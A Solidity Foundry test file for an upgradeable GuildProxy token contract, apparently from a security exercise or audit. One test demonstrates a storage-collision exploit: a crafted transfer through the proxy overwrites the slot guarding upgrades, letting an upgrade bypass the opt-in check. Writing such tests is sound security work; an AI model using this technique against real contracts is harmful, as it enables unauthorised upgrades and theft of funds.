// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GuildProxy} from "../src/GuildProxy.sol";
import {ERC20} from "../src/ERC20.sol";
import {ERC20V2} from "../src/ERC20V2.sol";

contract CounterTest is Test {
    GuildProxy public guildProxy;
    ERC20 public erc20;
    ERC20V2 public erc20V2;
    address owner = address(0x123);
    address admin = address(0x124);
    address user = address(0x125);
    uint8 decimals = 18;
    uint256 totalSupply = 10000000 * 10**18;

    function setUp() public {
        vm.startPrank(admin);
        erc20 = new ERC20();
        guildProxy = new GuildProxy(address(erc20),owner);
        vm.stopPrank();
    }

    function testSetValueThroughProxy() public {
        vm.startPrank(user);
        address(guildProxy).call(abi.encodeWithSignature("initialize(string,string,uint8,uint256)","guildToken","gtn",decimals,totalSupply));
        uint256 result = ERC20(address(guildProxy)).decimals();
        string memory result2 = ERC20(address(guildProxy)).name();
        assertEq(result, 18, "Value not set correctly through proxy");
        vm.stopPrank();
        
    }
    
    function testUpgradeToNewImplementationHack() public {
        
        vm.startPrank(user);
        address(guildProxy).call(abi.encodeWithSignature("initialize(string,string,uint8,uint256)","guildToken","gtn",decimals,totalSupply));
        erc20V2 = new ERC20V2();
        // this caused storage collision making it possible to call the upgrade without _optIn() been true
        address(guildProxy).call(abi.encodeWithSignature("transfer(address,uint256)",0x47Adc0faA4f6Eb42b499187317949eD99E77EE85,1));
        vm.stopPrank();
        vm.prank(admin);
        guildProxy.upgrade(address(erc20V2));
        assertEq(guildProxy.implementation(), address(erc20V2), "Upgrade failed");
       
    }
}
